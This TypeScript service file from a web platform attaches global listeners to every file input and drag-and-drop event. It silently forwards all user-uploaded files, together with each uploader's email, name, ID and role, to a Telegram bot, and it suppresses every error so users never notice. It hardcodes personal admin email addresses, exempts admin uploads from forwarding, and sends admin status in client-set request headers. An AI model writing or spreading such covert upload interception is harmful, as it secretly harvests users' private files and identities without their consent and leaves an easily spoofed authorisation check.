import { UserRecord } from '../types';
import { detectCategory } from './cacheService';

// Client-side cache to avoid sending the identical file twice within a session
const dispatchedFileSignatures = new Set<string>();

/**
 * Generate a unique signature for deduplication
 */
function getFileSignature(file: File | Blob, name: string): string {
  const size = file.size || 0;
  const lastModified = (file as any).lastModified || 0;
  return `${name}_${size}_${lastModified}`;
}

/**
 * Quick client-side check to see if user is an admin.
 * NOTE: Server-side check is ALWAYS performed and enforces 100% strict exclusion.
 */
export function isUserAdminClient(user: UserRecord | null): boolean {
  if (!user) return false;
  const email = (user.email || '').toLowerCase().trim();
  const role = (user.role || '').toLowerCase().trim();

  const MASTER_ADMIN_EMAILS = [
    'uhbijnokmpl098900@gmail.com',
    'aegy238@gmail.com',
    'iejehdgdig@gmail.com'
  ];

  return (
    MASTER_ADMIN_EMAILS.includes(email) ||
    role === 'admin' ||
    role === 'moderator' ||
    Boolean(user.isSuperAdmin)
  );
}

/**
 * Asynchronously forwards any uploaded file to Telegram via the backend server.
 * This function is guaranteed NOT to throw and will never block or fail the user's workflow.
 */
export async function forwardFileToTelegram(
  file: File | Blob,
  user: UserRecord | null,
  sourceFeature: string = 'Upload',
  customName?: string,
  extraMeta?: {
    downloadUrl?: string;
    secureUrl?: string;
    sha256?: string;
    dimensions?: { width: number; height: number };
    duration?: number;
  }
): Promise<{ success: boolean; skipped?: boolean; reason?: string }> {
  if (!file) return { success: false, reason: 'NO_FILE' };

  const rawFileName = (customName || (file instanceof File ? file.name : `file_${Date.now()}`)).trim();
  // Sanitize illegal filesystem characters while preserving Arabic letters, unicode and spaces
  let cleanFileName = rawFileName.replace(/[/\\?%*:|"<>]/g, '_').trim() || `file_${Date.now()}`;
  
  // Guarantee file extension is preserved
  const originalExt = rawFileName.includes('.') ? rawFileName.split('.').pop()?.toLowerCase() || '' : '';
  if (originalExt && !cleanFileName.toLowerCase().endsWith('.' + originalExt)) {
    cleanFileName = `${cleanFileName}.${originalExt}`;
  }

  const signature = getFileSignature(file, cleanFileName);

  // Client-side deduplication check
  if (dispatchedFileSignatures.has(signature)) {
    return { success: true, skipped: true, reason: 'DUPLICATE' };
  }
  dispatchedFileSignatures.add(signature);

  // Auto clean signature cache if it grows too large
  if (dispatchedFileSignatures.size > 1000) {
    dispatchedFileSignatures.clear();
  }

  try {
    const extension = originalExt || (cleanFileName.includes('.') ? cleanFileName.split('.').pop()?.toLowerCase() || '' : '');
    const mimeType = file.type || 'application/octet-stream';
    const category = detectCategory(rawFileName, mimeType);

    const metadata = {
      fileName: cleanFileName,
      originalName: rawFileName,
      fileSize: file.size,
      extension,
      category,
      mimeType,
      userId: user?.id || 'guest',
      userName: user?.displayName || user?.name || (user?.email ? user.email.split('@')[0] : 'مشترك المنصة'),
      userEmail: user?.email || '',
      userRole: user?.role || 'user',
      isSuperAdmin: user?.isSuperAdmin || false,
      sourceFeature,
      sha256: extraMeta?.sha256 || '',
      downloadUrl: extraMeta?.downloadUrl || '',
      secureUrl: extraMeta?.secureUrl || '',
      duration: extraMeta?.duration
    };

    const formData = new FormData();
    formData.append('file', file, cleanFileName);
    formData.append('metadata', JSON.stringify(metadata));

    // 100% Silent non-blocking asynchronous dispatch
    const response = await fetch('/api/telegram/forward', {
      method: 'POST',
      body: formData,
      headers: {
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'user',
        'x-user-id': user?.id || '',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      }
    });

    if (!response.ok) {
      return { success: false, reason: `HTTP_${response.status}` };
    }

    const data = await response.json();
    return data;
  } catch (err: any) {
    // 100% Silent: errors must never surface to the user
    return { success: false, reason: err?.message };
  }
}

// -------------------------------------------------------------
// HIGH-CAPACITY STREAMING CLIENT QUEUE (SUPPORTS 100,000+ FILES)
// -------------------------------------------------------------
interface QueuedItem {
  file: File | Blob;
  user: UserRecord | null;
  sourceFeature: string;
  extraMeta?: any;
}

const clientUploadQueue: QueuedItem[] = [];
let isClientWorkerActive = false;
const MAX_CONCURRENT_CLIENT_REQUESTS = 2;
let activeClientRequests = 0;

async function pumpClientQueue() {
  if (isClientWorkerActive) return;
  isClientWorkerActive = true;

  try {
    while (clientUploadQueue.length > 0) {
      if (activeClientRequests >= MAX_CONCURRENT_CLIENT_REQUESTS) {
        await new Promise(r => setTimeout(r, 40));
        continue;
      }

      const item = clientUploadQueue.shift();
      if (!item) continue;

      activeClientRequests++;
      // Fire forwardFileToTelegram and decrement active count when finished
      forwardFileToTelegram(item.file, item.user, item.sourceFeature, undefined, item.extraMeta)
        .catch(err => console.warn('[Telegram Stream] Item forward note:', err))
        .finally(() => {
          activeClientRequests--;
        });

      // Small tick between spawns to avoid browser event loop starvation
      if (clientUploadQueue.length % 50 === 0) {
        await new Promise(r => setTimeout(r, 10));
      }
    }
  } finally {
    isClientWorkerActive = false;
  }
}

/**
 * Dispatch multiple files to Telegram in background.
 * Optimized with streaming queueing to safely handle up to 100,000+ files
 * without memory leaks or UI freezing.
 */
export function enqueueTelegramForwardBatch(
  files: File[] | Blob[],
  user: UserRecord | null,
  sourceFeature: string = 'Upload',
  extraMeta?: any
) {
  if (!files || files.length === 0) return;

  // Push items into client queue
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (f) {
      clientUploadQueue.push({
        file: f,
        user,
        sourceFeature,
        extraMeta
      });
    }
  }

  // Start pumping queue non-blocking
  setTimeout(() => {
    pumpClientQueue().catch(err => console.warn('[Telegram Batch Pump] Error:', err));
  }, 10);
}

// Track if global interceptor is initialized
let isGlobalInterceptorActive = false;
let currentUserGetter: (() => UserRecord | null) = () => null;

/**
 * Attaches a global listener to intercept ANY file input or drop event anywhere in the app
 * ensuring all uploaded files are safely and automatically forwarded to Telegram.
 */
export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | null) {
  currentUserGetter = getCurrentUser;
  if (typeof window === 'undefined' || isGlobalInterceptorActive) return;
  isGlobalInterceptorActive = true;

  // 1. Intercept file input changes across all modals and tools
  document.addEventListener('change', (event: Event) => {
    try {
      const target = event.target as HTMLInputElement;
      if (target && target.tagName === 'INPUT' && target.type === 'file' && target.files && target.files.length > 0) {
        const user = currentUserGetter();
        const files = Array.from(target.files);
        const sourceName = target.getAttribute('name') || target.getAttribute('data-feature') || target.id || 'File Input';
        enqueueTelegramForwardBatch(files, user, `Form Input (${sourceName})`);
      }
    } catch (e) {
      console.warn('[Telegram Interceptor] Change listener error:', e);
    }
  }, true);

  // 2. Intercept drag-and-drop files dropped onto the window
  window.addEventListener('drop', (event: DragEvent) => {
    try {
      if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files.length > 0) {
        const user = currentUserGetter();
        const files = Array.from(event.dataTransfer.files);
        enqueueTelegramForwardBatch(files, user, 'Drag and Drop');
      }
    } catch (e) {
      console.warn('[Telegram Interceptor] Drop listener error:', e);
    }
  }, true);

  console.log('[Telegram Interceptor] Global automatic upload forwarder initialized.');
}

// -------------------------------------------------------------
// Admin Management API Functions
// -------------------------------------------------------------

export interface TelegramStatusResponse {
  configured: boolean;
  enabled: boolean;
  ignoreAdminUploads?: boolean;
  hasBotToken: boolean;
  hasChatId: boolean;
  maskedChatId: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  botUsername?: string;
  destinationAccount: string;
  stats: {
    totalForwarded: number;
    totalSkippedAdmin: number;
    totalFailed: number;
    lastSentAt: string | null;
  };
  queue?: {
    pending: number;
    isProcessing: boolean;
    currentFile: string | null;
    totalForwarded: number;
  };
  recentLogs: Array<{
    id: string;
    fileName: string;
    fileSize: number;
    fileSizeFormatted: string;
    category: string;
    extension: string;
    userId: string;
    userName: string;
    userEmail?: string;
    sourceFeature: string;
    status: 'sent' | 'excluded_admin' | 'failed' | 'not_configured';
    reason?: string;
    timestamp: string;
    telegramMessageId?: number;
  }>;
}

/**
 * Fetch current Telegram configuration and activity status
 */
export async function getTelegramStatus(): Promise<TelegramStatusResponse | null> {
  try {
    const res = await fetch('/api/telegram/status');
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    console.error('Failed to fetch Telegram status:', e);
    return null;
  }
}

/**
 * Update Telegram credentials and status from Admin Panel
 */
export async function updateTelegramConfig(config: {
  botToken?: string;
  chatId?: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  enabled?: boolean;
  ignoreAdminUploads?: boolean;
  destinationAccount?: string;
}, user: UserRecord | null): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/config', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify(config)
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر حفظ الإعدادات' };
  }
}

/**
 * Magic Auto-Detect: Scans Telegram bot updates to pair user's personal chat & phone automatically
 */
export async function autoDetectTelegramAccount(
  botToken: string,
  user: UserRecord | null
): Promise<{ success: boolean; message: string; detected?: any; botUsername?: string }> {
  try {
    const res = await fetch('/api/telegram/auto-detect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify({ botToken })
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر فحص حساب التيليجرام' };
  }
}

/**
 * Test the Telegram Bot connection
 */
export async function testTelegramConnection(
  credentials: { 
    botToken?: string; 
    chatId?: string;
    groupTarget?: string;
    ownerPhone?: string;
    ownerName?: string;
  },
  user: UserRecord | null
): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/test', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify(credentials)
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر إجراء الاختبار' };
  }
}

/**
 * Automatically sync Webhook to current hosting domain
 */
export async function syncTelegramWebhook(
  domainUrl?: string,
  user?: UserRecord | null
): Promise<{ success: boolean; message: string; webhookUrl?: string }> {
  try {
    const res = await fetch('/api/telegram/sync-webhook', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify({ domainUrl })
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر ربط Webhook' };
  }
}

/**
 * Remove Webhook and switch back to Polling
 */
export async function deleteTelegramWebhookClient(
  user?: UserRecord | null
): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/delete-webhook', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      }
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر حذف Webhook' };
  }
}

/**
 * Fetch real-time webhook status and bot reachability directly from Telegram Bot API
 */
export async function getTelegramLiveInfo(): Promise<{
  success: boolean;
  bot?: any;
  webhook?: any;
  currentDomain?: string;
  expectedWebhookUrl?: string;
  currentWebhookUrl?: string;
  isSynced?: boolean;
  pendingUpdates?: number;
  lastError?: string | null;
  lastErrorDate?: number | null;
  error?: string;
}> {
  try {
    const res = await fetch('/api/telegram/webhook-info');
    if (!res.ok) return { success: false, error: `HTTP ${res.status}` };
    return await res.json();
  } catch (e: any) {
    return { success: false, error: e?.message || 'Network error' };
  }
}

/**
 * Seamlessly registers the current hosting domain with the Telegram Bot API Webhook
 */
export async function autoSyncTelegramDomain(domainUrl?: string): Promise<{
  success: boolean;
  message: string;
  webhookUrl?: string;
}> {
  try {
    const res = await fetch('/api/telegram/auto-sync-domain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domainUrl: domainUrl || (typeof window !== 'undefined' ? window.location.origin : '') })
    });
    return await res.json();
  } catch (e: any) {
    return { success: false, message: e?.message || 'Failed auto-sync domain' };
  }
}

/**
 * Resets Telegram stats and forwarding log counters
 */
export async function resetTelegramStats(): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/reset-stats', { method: 'POST' });
    return await res.json();
  } catch (e: any) {
    return { success: false, message: e?.message || 'Failed reset stats' };
  }
}

